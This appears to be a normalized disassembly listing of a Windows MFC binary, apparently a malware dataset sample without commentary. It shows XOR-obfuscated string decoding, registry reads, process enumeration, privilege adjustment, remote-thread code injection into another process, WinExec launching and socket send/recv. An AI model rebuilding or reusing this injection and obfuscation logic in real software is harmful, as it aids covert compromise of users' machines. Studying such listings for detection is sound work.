push rw-data
push ecx
call edi
add esp 0x10
mov ecx ebx
call sub_403400
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0xa0
retn
push esi
call [ SetCurrentDirectoryA@IAT ]
lea edx [ esp + 0x2c ]
push 0x55
push edx
push rw-data
call sub_402ed0
add esp 0xc
lea eax [ esp + 0x2c ]
push 0x1
push eax
call [ WinExec@IAT ]
mov ecx ebx
call sub_403530
mov ecx ebx
call sub_4022e0
mov ecx ebx
call sub_402fd0
sub_403700
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edi [ esp + 0x18 ]
xor esi esi
not ecx
dec ecx
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
test ebp ebp
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov eax esi
cdq
idiv ecx
mov eax [ esp + 0x18 ]
mov dl [ edx + eax ]
mov al [ esi + ebx ]
xor dl al
xor dl 0x96
mov [ esi + ebx ] dl
inc esi
cmp esi ebp
jl r-xdata
sub_403750
sub esp 0x8
push ebx
push ebp
lea eax [ esp + 0x14 ]
push edi
mov ebp ecx
push eax
mov ecx [ esp + 0x1c ]
push 0x20019
push 0x0
push ecx
push 0x80000001
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x24 ] 0x3
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn 0x8
mov edi [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0xc ]
mov ebx [ RegQueryValueExA@IAT ]
push edx
push eax
lea eax [ esp + 0x18 ]
push eax
push 0x0
push edi
push ecx
call ebx
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov edx [ esp + 0xc ]
push esi
push edx
call [ malloc@IAT ]
mov edx [ esp + 0x20 ]
add esp 0x4
mov esi eax
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x18 ]
push esi
push ecx
push 0x0
push edi
push edx
call ebx
mov eax [ esp + 0x10 ]
push rw-data
push esi
mov ecx ebp
mov [ eax + esi ] 0x0
call sub_403700
mov ecx [ esp + 0x1c ]
push ecx
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
pop edi
pop ebp
pop ebx
add esp 0x8
retn 0x8
sub_403810
mov eax [ esp + 0x4 ]
push esi
push eax
push 0x0
push 0x3a
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
retn
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
push esi
call sub_403860
add esp 0x14
push esi
call [ CloseHandle@IAT ]
xor eax eax
pop esi
retn
sub_403860
sub esp 0x340
push ebx
push ebp
mov ebp [ VirtualAllocEx@IAT ]
push esi
mov esi [ esp + 0x350 ]
push edi
push 0x40
xor ebx ebx
push 0x1000
mov ecx 0xcd
xor eax eax
lea edi [ esp + 0x24 ]
push 0x1000
push ebx
[ edi ]
push esi
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] ebx
call ebp
mov edi eax
test edi edi
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call [ CloseHandle@IAT ]
mov ebp [ VirtualFreeEx@IAT ]
test edi edi
je r-xdata
push 0x4
push 0x1000
push 0x334
push ebx
push esi
call ebp
mov ebx eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
push 0x8000
push 0x0
push edi
push esi
call ebp
push 0x0
push 0x1000
push sub_403a80
push edi
push esi
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
test eax eax
pop ebx
je r-xdata
push 0x8000
push 0x0
push ebx
push esi
call ebp
mov eax [ esp + 0x360 ]
lea ecx [ esp + 0x48 ]
push eax
push ecx
call [ wcscpy@IAT ]
mov eax [ esp + 0x36c ]
add esp 0x8
test eax eax
jne r-xdata
xor eax eax
add esp 0x340
retn
push eax
call [ FreeLibrary@IAT ]
lea edx [ esp + 0x250 ]
push 0x100
push edx
push eax
call sub_403a50
add esp 0xc
mov [ esp + 0x250 ] al
jmp r-xdata
mov ebp [ GetProcAddress@IAT ]
mov edx eax
push rw-data
push edx
call ebp
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x10 ]
push rw-data
push eax
call ebp
mov ecx [ esp + 0x10 ]
push rw-data
push ecx
mov [ esp + 0x44 ] eax
call ebp
mov edx [ esp + 0x10 ]
push rw-data
push edx
mov [ esp + 0x48 ] eax
call ebp
mov ecx [ esp + 0x38 ]
mov [ esp + 0x44 ] eax
test ecx ecx
je r-xdata
mov eax [ esp + 0x358 ]
mov ecx [ esp + 0x35c ]
push rw-data
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] ecx
call [ LoadLibraryA@IAT ]
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov ecx [ esp + 0x3c ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x40 ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x20 ]
push 0x334
push eax
push ebx
push esi
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push ebx
push edi
push 0x0
push 0x0
push esi
call [ CreateRemoteThread@IAT ]
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
mov edx eax
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
mov [ esp + 0x18 ] eax
jne r-xdata
push eax
lea eax [ esp + 0x20 ]
push 0x334
push eax
push ebx
push esi
call [ ReadProcessMemory@IAT ]
sub_403a50
mov ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
xor eax eax
push edi
mov [ esi ] al
cmp [ ecx ] ax
je r-xdata
pop edi
pop esi
retn
mov edi [ esp + 0x14 ]
mov dl [ ecx ]
add ecx 0x2
mov [ eax + esi ] dl
inc eax
cmp [ ecx ] 0x0
jne r-xdata
cmp eax edi
jae r-xdata
sub_403a80
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x14 ]
mov [ esi ] 0x0
test eax eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0xc ] 0x0
je r-xdata
lea edx [ esi + 0x2c ]
push edx
call [ esi + 0x20 ]
mov edi eax
lea eax [ esi + 0x2c ]
push eax
call [ esi + 0x1c ]
xor ecx ecx
mov edi eax
test eax eax
sete cl
test edi edi
mov [ esi + 0x10 ] eax
mov [ esi ] ecx
jne r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
push edi
call [ esi + 0x28 ]
test eax eax
je r-xdata
mov cl [ esi + 0x234 ]
lea eax [ esi + 0x234 ]
test cl cl
je r-xdata
mov [ esi + 0x10 ] edi
pop edi
xor eax eax
pop esi
retn 0x4
push edi
call [ esi + 0x24 ]
neg eax
sbb eax eax
inc eax
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x4 ] 0x0
call eax
mov [ esi + 0x8 ] eax
jmp r-xdata
sub_403b10
sub esp 0x1c
lea eax [ esp ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
add esp 0x1c
retn
lea ecx [ esp + 0x4 ]
push ecx
push rw-data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push 0x0
push 0x0
lea edx [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x8 ]
push 0x10
push edx
push 0x0
push eax
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x2c ] ecx
mov [ esp + 0x30 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
mov ecx [ esp ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ esp ]
push edx
call [ CloseHandle@IAT ]
add esp 0x1c
retn
sub_403ba0
sub esp 0x128
push ebx
push ebp
push esi
push edi
push 0x0
push 0xf
or ebp 0xffffffff
call CreateToolhelp32Snapshot
mov esi eax
lea eax [ esp + 0x10 ]
push eax
push esi
mov [ esp + 0x18 ] 0x128
call Process32First
test al al
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x128
retn
mov edi [ esp + 0x13c ]
mov ebx [ _stricmp@IAT ]
mov ebp [ esp + 0x18 ]
lea edx [ esp + 0x10 ]
push edx
push esi
call Process32Next
test al al
jne r-xdata
lea ecx [ esp + 0x34 ]
push edi
push ecx
call ebx
add esp 0x8
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x128
retn
sub_403c60
push 0xffffffff
push sub_40d8a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push 0x0
mov [ esp + 0x8 ] esi
call Ordinal_MFC42_561
lea ecx [ esi + 0xc4 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_540
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_403cd0
push 0xffffffff
push sub_40d8c8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xc4 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_800
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_815
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_403d60
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40d8ea
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push esi
mov esi ecx
mov eax [ esi + 0x8c ]
lea ecx [ esi + 0xc4 ]
push eax
call Ordinal_MFC42_860
lea ecx [ esp + 0x8 ]
push 0x55
push ecx
push rw-data
call sub_402ed0
add esp 0xc
lea edx [ esp + 0x8 ]
push edx
push 0x0
call [ FindWindowA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x20
retn
push eax
call Ordinal_MFC42_1134
add esp 0x4
mov ecx esi
call Ordinal_MFC42_2621
push rw-data
mov ecx esi
call Ordinal_MFC42_6117
push rw-data
mov ecx esi
call Ordinal_MFC42_6117
push 0x754
call Ordinal_MFC42_823
add esp 0x4
mov [ esp + 0x4 ] eax
test eax eax
mov [ esp + 0x20 ] 0x0
je r-xdata
xor eax eax
mov ecx eax
call sub_4010a0
jmp r-xdata
push 0x0
mov [ esi + 0x20 ] eax
mov edx [ eax ]
push 0x0
push 0xcf8000
push 0x80
mov ecx eax
mov [ esp + 0x30 ] 0xffffffff
call [ edx + 0xc0 ]
sub_403e50
mov eax [ rw-data ]
push ebx
test eax eax
jne r-xdata
xor eax eax
pop ebx
retn
mov ebx [ esp + 0x8 ]
test bl 0x2
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] ebx
call sub_403e90
test eax eax
je r-xdata
mov eax 0x2
pop ebx
retn
sub_403e90
sub esp 0x190
lea eax [ esp ]
push eax
push 0x101
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
mov eax 0x2
add esp 0x190
retn
mov ax [ esp ]
cmp al 0x1
jne r-xdata
call [ WSACleanup@IAT ]
xor ecx ecx
mov cl ah
cmp cl al
jne r-xdata
xor eax eax
add esp 0x190
retn
sub_403ee0
push ecx
mov eax [ rw-data ]
test eax eax
jne r-xdata
lea eax [ esp ]
push eax
call sub_405860
mov ecx [ esp + 0x4 ]
add esp 0x4
neg eax
sbb eax eax
not eax
and eax ecx
pop ecx
retn
push 0x3
call sub_403e50
add esp 0x4
test eax eax
je r-xdata
xor eax eax
pop ecx
retn
sub_403f20
mov eax [ esp + 0x8 ]
cmp eax 0x2710
jge r-xdata
cmp eax 0x4e20
jl r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push ecx
push eax
push edx
call sub_4059c0
add esp 0xc
retn
cmp eax 0x7530
jl r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
push eax
mov eax [ esp + 0x10 ]
push eax
call sub_4059c0
add esp 0x10
retn
sub_403f70
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov al [ esi + 0x189 ]
push edi
test al al
je r-xdata
mov ecx [ eax + 0x14 ]
test ecx ecx
jne r-xdata
mov eax [ esi ]
pop edi
test eax eax
jne r-xdata
mov edi [ esi ]
call sub_404d00
cmp edi eax
je r-xdata
push esi
call sub_408930
add esp 0x4
pop esi
retn
call sub_4050e0
test eax eax
mov [ esi ] eax
jne r-xdata
test edi edi
je r-xdata
mov eax 0x1b
pop esi
retn
call sub_404d00
mov [ esi ] eax
push edi
call sub_409080
add esp 0x4
sub_403fe0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov al [ esi + 0x189 ]
test al al
jne r-xdata
mov ecx [ eax + 0x14 ]
test ecx ecx
jne r-xdata
push esi
call sub_405780
add esp 0x4
pop esi
retn
mov eax [ esi ]
push eax
call sub_409080
add esp 0x4
sub_404020
push esi
push edi
push 0x8
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax [ esp + 0x10 ]
mov [ esi + 0x4 ] 0x0
push eax
call [ _strdup@IAT ]
add esp 0x4
mov [ esi ] eax
test eax eax
je r-xdata
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
mov eax esi
pop edi
pop esi
retn
push edi
call sub_404080
add esp 0x4
mov [ eax + 0x4 ] esi
mov eax edi
pop edi
pop esi
retn
sub_4040a0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push ebx
mov ebx [ free@IAT ]
push edi
push esi
call ebx
add esp 0x4
mov esi edi
test edi edi
jne r-xdata
push eax
call ebx
add esp 0x4
mov eax [ esi ]
mov edi [ esi + 0x4 ]
test eax eax
je r-xdata
pop edi
pop ebx
sub_4040d0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push esi
push 0x0
push eax
push ecx
push edx
call [ send@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ esp + 0x18 ]
mov [ eax ] esi
mov eax esi
inc eax
pop esi
neg eax
sbb eax eax
and al 0xc9
add eax 0x37
retn
call GetLastError
cmp eax 0x2733
jne r-xdata
xor esi esi
sub_404120
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov edi [ esp + 0x20 ]
test edi edi
jne r-xdata
mov bl [ esp + 0x18 ]
mov esi [ esp + 0x14 ]
test bl 0x1
je r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
test bl 0x2
je r-xdata
mov eax [ esi + 0x1c ]
push eax
push edi
push 0x1
push ebp
call [ esi + 0x70 ]
add esp 0x10
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ esi + 0x74 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x17
pop ebx
retn
mov ecx [ esi + 0x24 ]
push ecx
push edi
push 0x1
push ebp
call eax
add esp 0x10
cmp eax edi
je r-xdata
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x17
pop ebx
retn
test eax eax
jne r-xdata
mov eax [ esi + 0x70 ]
sub_4041b0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push esi
push edi
mov edi [ esp + 0x1c ]
push 0x0
push eax
push ecx
push edx
mov [ edi ] 0x0
call [ recv@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov [ edi ] esi
pop edi
xor eax eax
pop esi
retn
call GetLastError
cmp eax 0x2733
jne r-xdata
or eax esi
pop edi
pop esi
retn
sub_404220
sub esp 0xc
push ebp
push esi
xor ebp ebp
push 0x2c
mov [ esp + 0xc ] ebp
mov [ esp + 0x14 ] ebp
call [ malloc@IAT ]
mov esi eax
add esp 0x4
cmp esi ebp
mov [ esp + 0xc ] esi
je r-xdata
pop esi
mov eax 0x1
pop ebp
add esp 0xc
retn
push ebx
push edi
mov ecx 0xb
xor eax eax
mov edi esi
mov ebx 0x3
[ edi ]
mov eax [ esp + 0x28 ]
lea edi [ eax - 0x4 ]
mov esi [ esp + 0x14 ]
mov edi [ free@IAT ]
mov eax [ edi + 0x4 ]
add edi 0x4
cmp eax 0x11
je r-xdata
mov eax esi
mov esi [ esi + 0x28 ]
push eax
call edi
add esp 0x4
test esi esi
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop ebx
pop esi
pop ebp
add esp 0xc
retn
mov esi [ esp + 0x14 ]
mov ebp [ esp + 0x24 ]
mov ebx [ esp + 0x20 ]
xor edi edi
dec eax
je r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
cmp [ esi ] ebp
je r-xdata
sub eax ebx
je r-xdata
mov [ esp + 0x10 ] 0x5
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
add edi 0x4
cmp eax ebp
je r-xdata
mov [ esp + 0x10 ] 0x2
jmp r-xdata
cmp [ esi + 0x8 ] ebp
je r-xdata
sub eax 0x6
je r-xdata
mov eax [ esi + 0x14 ]
mov ecx eax
and ecx 0x1
je r-xdata
test [ esi + 0x14 ] 0x1
jne r-xdata
mov [ esp + 0x10 ] ebx
jmp r-xdata
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x10 ] ebp
jne r-xdata
mov eax [ edi + 0x4 ]
add edi 0x4
cmp eax ebp
je r-xdata
mov [ esp + 0x10 ] 0x2
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ edi + 0x4 ]
add edi 0x4
cmp ecx ebp
je r-xdata
mov [ esp + 0x10 ] 0x4
jmp r-xdata
mov edx [ esi + 0x18 ]
test edx edx
jne r-xdata
test al 0x8
jne r-xdata
mov [ esi + 0x8 ] eax
jmp r-xdata
cmp eax ebp
je r-xdata
test [ esi + 0x14 ] 0x1
je r-xdata
test al 0x2
je r-xdata
test al 0x10
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esp + 0x10 ] ebx
or al 0x1
mov [ esi + 0x14 ] eax
jmp r-xdata
push eax
call [ _strdup@IAT ]
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x14 ]
add esp 0x4
or al 0x1
mov [ esi + 0x14 ] eax
jmp r-xdata
cmp eax ebp
je r-xdata
test ecx ecx
jne r-xdata
test al 0x8
jne r-xdata
test al 0x20
jne r-xdata
push esi
push ebp
push eax
call [ _strdup@IAT ]
add esp 0x4
push eax
call sub_404570
mov esi eax
add esp 0xc
cmp esi ebp
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
test al 0x10
je r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
test [ esi + 0x14 ] 0x4
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esi + 0x8 ]
push ecx
push edx
call sub_4045d0
push eax
call [ _strdup@IAT ]
add esp 0xc
mov [ esi + 0x10 ] eax
test [ esi + 0x14 ] 0x2b
jne r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x24 ]
mov edx [ esi + 0x14 ]
push ebp
push ebx
push edi
push eax
mov eax [ esi + 0x10 ]
push ecx
mov ecx [ esi + 0x1c ]
push edx
mov edx [ esi + 0x18 ]
push eax
mov eax [ esi + 0xc ]
push ecx
mov ecx [ esi + 0x8 ]
push edx
mov edx [ esi + 0x4 ]
push eax
mov eax [ esi ]
push ecx
push edx
push eax
call sub_4044c0
mov edi eax
add esp 0x34
test edi edi
jne r-xdata
mov ecx [ esi + 0xc ]
lea edx [ esi + 0x8 ]
push ecx
push edx
call sub_404670
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
push esi
call sub_404670
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x10 ] 0x1
jmp r-xdata
mov esi [ esi + 0x28 ]
test esi esi
jne r-xdata
mov [ esp + 0x18 ] eax
cmp [ esi ] 0x0
je r-xdata
jmp r-xdata
sub_4044c0
push 0x30
call [ malloc@IAT ]
mov edx eax
add esp 0x4
test edx edx
je r-xdata
xor eax eax
retn
push edi
mov ecx 0xc
xor eax eax
mov edi edx
[ edi ]
mov edi [ esp + 0x8 ]
test edi edi
mov [ edx + 0x4 ] edi
je r-xdata
xor ecx ecx
mov ecx [ esp + 0xc ]
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x34 ]
mov eax [ ecx ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x24 ]
mov [ edx + 0x24 ] ecx
mov [ eax + 0x24 ] edx
mov eax edx
retn
mov eax [ esp + 0x10 ]
mov [ edx + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ edx + 0xc ] eax
mov eax [ esp + 0x18 ]
mov [ edx + 0x10 ] ecx
mov ecx [ esp + 0x1c ]
mov [ edx + 0x14 ] eax
mov eax [ esp + 0x20 ]
mov [ edx + 0x18 ] ecx
mov ecx [ esp + 0x28 ]
mov [ edx + 0x1c ] eax
mov eax [ esp + 0x2c ]
mov [ edx + 0x20 ] ecx
mov ecx [ esp + 0x24 ]
mov [ edx + 0x2c ] eax
mov eax [ esp + 0x30 ]
mov [ edx + 0x28 ] ecx
test eax eax
pop edi
je r-xdata
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
jmp r-xdata
mov [ eax ] edx
mov [ ecx ] edx
mov eax edx
retn
mov eax [ esp + 0x30 ]
sub_404570
push 0x2c
call [ malloc@IAT ]
mov edx eax
add esp 0x4
test edx edx
je r-xdata
xor eax eax
retn
push edi
mov ecx 0xb
xor eax eax
mov edi edx
[ edi ]
mov eax [ esp + 0x8 ]
pop edi
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov [ edx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ edx + 0x14 ] 0x1
test eax eax
je r-xdata
mov [ edx + 0x10 ] eax
mov ecx [ eax + 0x28 ]
mov [ edx + 0x28 ] ecx
mov [ eax + 0x28 ] edx
mov eax edx
retn
sub_4045d0
push ecx
mov eax [ esp + 0xc ]
test eax eax
mov [ esp ] eax
jne r-xdata
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
mov [ esp + 0x1c ] 0x0
mov esi rw-data
mov [ esp ] rw-data
mov edx [ esp + 0x1c ]
add esi 0x8
inc edx
cmp esi rw-data
mov [ esp + 0x1c ] edx
jl r-xdata
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
push edx
dec ecx
mov edx ebx
mov edi ebx
sub edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx ecx
push edx
call sub_40a820
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esi ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ebx
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx ebp
jb r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esp + 0x1c ]
pop edi
pop esi
pop ebp
mov eax [ eax * 8 + rw-data ]
pop ebx
pop ecx
retn
sub_404670
push ecx
mov eax [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ esp + 0x14 ]
xor bl bl
push esi
mov esi [ eax ]
push edi
test ebp ebp
mov [ esp + 0x10 ] bl
jne r-xdata
mov ecx [ esp + 0x10 ]
and ecx 0xff
add ecx ebp
push ecx
call [ malloc@IAT ]
mov edx [ esp + 0x1c ]
add esp 0x4
test eax eax
mov [ edx ] eax
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
mov bl 0x1
[ edi ]
not ecx
dec ecx
mov [ esp + 0x10 ] bl
mov ebp ecx
mov ecx ebp
mov edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
test bl bl
[ edi ] [ esi ]
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ esp + 0x18 ]
mov edx [ ecx ]
mov [ edx + ebp ] 0x0
sub_4046f0
push ebx
push 0x29
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
push esi
push edi
push 0x0
call [ time@IAT ]
mov ecx [ rw-data ]
add eax ecx
inc ecx
push eax
mov [ rw-data ] ecx
call [ srand@IAT ]
mov ecx 0x7
mov esi rw-data
mov edi ebx
xor eax eax
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
add esp 0x8
[ edi ]
not ecx
dec ecx
mov esi ecx
cmp esi 0x28
jae r-xdata
pop ebx
retn
pop edi
mov [ ebx + 0x28 ] 0x0
mov eax ebx
pop esi
pop ebx
retn
mov edi [ rand@IAT ]
mov al [ eax + rw-data ]
mov [ esi + ebx ] al
inc esi
cmp esi 0x28
jb r-xdata
dec eax
or eax 0xfffffff0
inc eax
call edi
and eax 0x8000000f
jns r-xdata
sub_404780
push ebx
mov ebx [ free@IAT ]
push esi
mov esi [ esp + 0xc ]
push edi
mov eax [ esi + 0x4 ]
mov edi [ esi ]
push eax
call ebx
push esi
call ebx
add esp 0x8
mov esi edi
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4047b0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push ebp
push edi
mov edi [ free@IAT ]
test [ esi + 0x28 ] 0x4
jne r-xdata
push eax
call sub_4047b0
add esp 0x4
test [ esi + 0x28 ] 0x8
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
add esp 0x4
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call edi
add esp 0x4
push eax
call edi
add esp 0x4
push esi
call edi
add esp 0x4
mov esi ebp
test ebp ebp
jne r-xdata
push eax
call edi
add esp 0x4
mov eax [ esi + 0x24 ]
mov ebp [ esi ]
test eax eax
je r-xdata
pop edi
pop ebp
sub_404830
sub esp 0x410
mov eax [ esp + 0x414 ]
push ebx
mov ebx [ esp + 0x41c ]
push ebp
push esi
push edi
xor edi edi
cmp ebx edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] edi
mov [ eax ] edi
jne r-xdata
call sub_4046f0
mov esi eax
lea ecx [ esp + 0x10 ]
push esi
push rw-data
push ecx
mov [ esp + 0x20 ] esi
call sub_404bc0
mov edx [ esp + 0x1c ]
add esp 0xc
mov [ esp + 0x1c ] edx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x410
retn
push esi
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_404bc0
push 0x0
lea edx [ esp + 0x20 ]
push rw-data
push edx
add edi eax
call sub_404b40
mov ecx [ ebx + 0x4 ]
add edi eax
mov eax [ ebx + 0x8 ]
lea edx [ esp + 0x28 ]
push eax
push ecx
push edx
call sub_404b40
add edi eax
push 0x0
lea eax [ esp + 0x38 ]
push rw-data
push eax
call sub_404b40
add edi eax
mov eax [ ebx + 0x24 ]
add esp 0x30
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_404bc0
add esp 0x8
add edi eax
mov ebp ebx
call sub_4046f0
push eax
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
mov [ esp + 0x24 ] eax
call sub_404bc0
add esp 0xc
add edi eax
test [ ebx + 0x28 ] 0x11
je r-xdata
mov eax [ ebp + 0x2c ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x2c ]
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
push eax
push edx
lea eax [ esp + 0x18 ]
push rw-data
push eax
call sub_404bc0
add esp 0x10
jmp r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x20 ]
test esi esi
je r-xdata
push eax
lea edx [ esp + 0x14 ]
push rw-data
push edx
call sub_404bc0
add esp 0xc
add edi eax
push eax
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_404bc0
add esp 0xc
mov eax [ ebx + 0xc ]
add edi eax
push 0x0
lea edx [ esp + 0x14 ]
push rw-data
push edx
call sub_404b40
add edi eax
mov eax [ ebx + 0x28 ]
add esp 0xc
test al 0x3
jne r-xdata
mov eax [ esi ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
call sub_404bc0
mov esi [ esi + 0x4 ]
add esp 0xc
add edi eax
test esi esi
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
